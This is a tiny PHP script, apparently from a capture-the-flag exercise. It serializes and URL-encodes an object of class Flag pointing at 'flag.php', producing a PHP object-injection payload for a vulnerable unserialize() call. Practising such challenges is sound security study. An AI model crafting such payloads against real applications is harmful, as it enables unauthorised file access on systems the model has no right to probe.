<?php
    class Flag{
        public $file = 'flag.php';
    }

    $a = new Flag();
    echo urlencode(serialize($a)); 
?>

